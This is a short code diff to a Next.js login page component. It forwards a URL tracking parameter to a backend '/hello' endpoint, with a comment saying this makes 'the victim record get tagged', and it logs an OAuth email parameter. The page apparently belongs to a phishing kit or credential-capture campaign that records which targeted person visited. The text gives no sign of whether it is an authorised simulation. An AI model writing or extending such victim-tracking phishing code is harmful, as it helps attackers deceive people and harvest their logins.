@@ -25,10 +25,13 @@ export default function Login() {
   console.log("oauth2 is :" + email_parameter);
   const cookie = getCookie("id");
 
-  const hello = async () => {
+  const hello = async (trackingParam) => {
     if (cookie == null) {
       try {
-        const res = await fetch(`${process.env.API_URL}/hello`, {
+        const helloUrl = trackingParam
+          ? `${process.env.API_URL}/hello?${process.env.NEXT_PUBLIC_tracking_parameter}=${encodeURIComponent(trackingParam)}`
+          : `${process.env.API_URL}/hello`;
+        const res = await fetch(helloUrl, {
           method: "GET",
           cache: "no-cache",
         });
@@ -115,10 +118,11 @@ export default function Login() {
   };
 
   useEffect(() => {
-    hello();
-
     const r = searchParams.get(process.env.NEXT_PUBLIC_tracking_parameter);
     const o = searchParams.get("oauth2");
+
+    // Pass tracking param to /hello so the victim record gets tagged
+    hello(r || "");
 
     if (r) {
       setVisitUser(r);
